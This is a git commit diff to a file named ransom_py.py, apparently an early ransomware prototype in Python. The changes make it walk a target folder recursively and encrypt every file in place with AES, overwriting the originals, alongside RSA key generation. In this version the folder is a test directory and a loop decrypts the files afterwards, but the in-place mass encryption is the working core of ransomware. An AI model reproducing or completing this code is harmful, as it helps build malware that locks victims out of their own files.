c87bdf4a8020fe2d321742ac404278ecb1a962e8
purple_flood <49845374+PurpleFlood@users.noreply.github.com>
2024-03-04 15:46:45 +0100

    ok

--- ransom_py.py
+++ ransom_py.py
@@ -1,6 +1,7 @@
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
 import os
+from random import randint
 
 def generate_aes_key():
     """
@@ -42,31 +43,17 @@ def decrypt_file_aes(input_file, output_file, aes_key):
         data = cipher.decrypt_and_verify(ciphertext, tag)
     with open(output_file, 'wb') as f_out:
         f_out.write(data)
-"""
-def list_files_recursive(target_folder):
-    
-    # Recursively lists all files within a target folder.
-    
-    if not os.path.exists(target_folder):
-        print("The target folder does not exist.")
-        return
-    files_list = []
-    for root, directories, files in os.walk(target_folder):
-        for file_name in files:
-            file_path = os.path.join(root, file_name)
-            files_list.append(file_path)
-    return files_list
-"""
+
 def list_files(target_folder):
     files_found = []
 
     # Parcourir tous les fichiers et sous-dossiers dans le dossier donné
-    for root, dirs, files in os.walk(dossier):
+    for root, dirs, files in os.walk(target_folder):
         for fichier in files:
             chemin_fichier = os.path.join(root, fichier)
-            fichiers_trouves.append(chemin_fichier)
+            files_found.append(chemin_fichier)
 
-    return fichiers_trouves
+    return files_found
 
 def main():
 
@@ -76,29 +63,27 @@ def main():
     private_key, public_key = generate_rsa_key_pair()
 
     # Save RSA keys to files
-    with open("private_key.pem", "wb") as f:
+    with open("./pem/private_key.pem", "wb") as f:
         f.write(private_key)
-    with open("public_key.pem", "wb") as f:
+    with open("./pem/public_key.pem", "wb") as f:
         f.write(public_key)
 
     # Encrypt a file using AES
-    for i in liste:
-        print(i[1], i[0])  # Replace with the path to your input file
+    # Replace with the path to your input file
     #encrypted_file = "./out/encrypted_file.bin"  # Replace with the path to your encrypted file
     #encrypt_file_aes(input_file, encrypted_file, aes_key)
-"""
-    # Decrypt the encrypted file using AES
-    decrypted_file = "decrypted_file.txt"  # Replace with the desired output file path
-    decrypt_file_aes(encrypted_file, decrypted_file, aes_key)
-"""
-    # List all files in a target folder
-    target_folder = "./test/"  # Replace with the path of your target folder
-    files_list = list_files_recursive(target_folder)
-    print("List of files in the target folder:")
-    for file_path in files_list:
-        print(file_path)
 
-    print("Keys generated, file encrypted, and decrypted successfully.")
-"""
+    target_folder="./test/"
+    files_list=list_files(target_folder)
+    encrypted_files_list=[]
+    for files_path in files_list:
+        encrypt_file_aes(files_path, files_path, aes_key)
+        print(files_path)
+
+    # Decrypt the encrypted file using AES
+    for files_path in files_list:
+        # Replace with the desired output file path
+        decrypt_file_aes(files_path, files_path, aes_key)
+
 if __name__ == "__main__":
     main()
